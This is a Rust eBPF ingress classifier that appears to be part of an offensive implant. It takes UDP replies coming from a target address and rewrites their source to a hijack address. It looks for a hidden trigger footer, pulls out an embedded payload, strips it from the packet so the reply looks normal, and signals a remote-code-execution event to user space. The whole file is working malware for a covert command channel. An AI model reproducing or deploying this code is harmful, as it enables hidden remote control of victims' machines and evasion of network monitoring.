use core::net::Ipv4Addr;

use aya_ebpf::{
    bindings::{TC_ACT_OK, TC_ACT_PIPE},
    helpers::bpf_skb_change_tail,
    macros::{classifier, map},
    maps::PerCpuArray,
    programs::TcContext,
};
use aya_log_ebpf::{error, info};
use network_types::{
    eth::{EthHdr, EtherType},
    ip::{IpProto, Ipv4Hdr},
    udp::UdpHdr,
};

use crate::common::{
    load_bytes, update_addr, update_ip_hdr_tot_len, update_udp_hdr_len, Rce, UpdateType, HIJACK_IP,
    IP_SRC_ADDR_OFFSET, RBUF, TARGET_IP, UDP_CSUM_OFFSET, UDP_OFFSET,
};

#[classifier]
pub fn tamanoir_ingress(mut ctx: TcContext) -> i32 {
    match tc_process_ingress(&mut ctx) {
        Ok(ret) => ret,
        Err(_) => TC_ACT_PIPE,
    }
}

#[inline]
fn submit(rce: Rce) {
    if let Some(mut buf) = RBUF.reserve::<Rce>(0) {
        unsafe { (*buf.as_mut_ptr()) = rce };
        buf.submit(0);
    }
}

pub struct Buf {
    pub buf: [u8; 8192],
}

#[map]
pub static DNS_PAYLOAD_BUFFER: PerCpuArray<Buf> = PerCpuArray::with_max_entries(1, 0);

const AR_HEADER_SZ: usize = 13;
const FOOTER_TXT: &str = "r10n4m4t/";
const FOOTER_EXTRA_BYTES: usize = 3;

#[inline]
fn tc_process_ingress(ctx: &mut TcContext) -> Result<i32, i64> {
    let target_ip: u32 = unsafe { core::ptr::read_volatile(&TARGET_IP) };
    let hijack_ip: u32 = unsafe { core::ptr::read_volatile(&HIJACK_IP) };

    let ethhdr: EthHdr = ctx.load(0)?;
    if let EtherType::Ipv4 = ethhdr.ether_type {
        let header = ctx.load::<Ipv4Hdr>(EthHdr::LEN)?;
        let addr = header.src_addr;
        if let IpProto::Udp = header.proto {
            if u32::from_be(addr) == target_ip {
                info!(ctx, "\n-----\nNew intercepted request:\n-----");
                let udp_hdr = &ctx.load::<UdpHdr>(UDP_OFFSET)?;
                let udp_port = &udp_hdr.source;
                update_addr(ctx, &addr, &hijack_ip.to_be(), UpdateType::Src)?;

                ctx.l4_csum_replace(UDP_CSUM_OFFSET, addr as u64, hijack_ip as u64, 4)
                    .map_err(|_| {
                        error!(ctx, "error: l4_csum_replace");
                        -1
                    })?;

                let mut footer = [0u8; FOOTER_TXT.len() + FOOTER_EXTRA_BYTES];
                let _ = ctx.load_bytes(ctx.len() as usize - FOOTER_TXT.len(), &mut footer)?;

                let last_bytes_rtcp_trigger: [u8; FOOTER_TXT.len()] =
                    FOOTER_TXT.as_bytes().try_into().unwrap();

                if footer[..FOOTER_TXT.len()] == last_bytes_rtcp_trigger {
                    info!(ctx, " !! TRIGGER MOTHERFUCKER !! ");
                    let payload_sz = u16::from_be_bytes(
                        footer
                            .get(footer.len().saturating_sub(2)..)
                            .ok_or(0u32)?
                            .try_into()
                            .unwrap(),
                    ) as usize;

                    info!(ctx, "payload is {} bytes long\npayload is:", payload_sz);

                    let record_sz =
                        AR_HEADER_SZ + payload_sz as usize + FOOTER_TXT.len() + FOOTER_EXTRA_BYTES;
                    let payload_buf = unsafe {
                        let ptr = DNS_PAYLOAD_BUFFER.get_ptr_mut(0).ok_or(-1)?;
                        &mut (*ptr).buf
                    };
                    load_bytes(
                        ctx,
                        ctx.len().saturating_sub(
                            (FOOTER_TXT.len() + FOOTER_EXTRA_BYTES + payload_sz) as u32,
                        ) as usize,
                        payload_buf,
                    )?;

                    let payload = &payload_buf.get(..payload_sz);
                    if let Some(p) = *payload {
                        for c in p {
                            info!(ctx, " {} ", *c);
                        }
                    }

                    unsafe {
                        bpf_skb_change_tail(
                            ctx.skb.skb,
                            ctx.len().saturating_sub(record_sz as u32),
                            0,
                        );
                    };
                    update_ip_hdr_tot_len(
                        ctx,
                        &header.tot_len,
                        &(u16::from_be(header.tot_len).saturating_sub(record_sz as u16)).to_be(),
                    )?;
                    update_udp_hdr_len(
                        ctx,
                        &(u16::from_be(udp_hdr.len).saturating_sub(record_sz as u16)).to_be(),
                    )?;
                    submit(Rce {
                        prog: 0,
                        active: true,
                    })
                }
                info!(
                    ctx,
                    "{}:{} -> {}:{}",
                    Ipv4Addr::from_bits(u32::from_be(addr)),
                    u16::from_be(*udp_port),
                    Ipv4Addr::from_bits(u32::from_be(ctx.load::<u32>(IP_SRC_ADDR_OFFSET).unwrap())),
                    u16::from_be(ctx.load::<u16>(UDP_OFFSET).unwrap()),
                );
            }
        };
    }

    Ok(TC_ACT_OK)
}
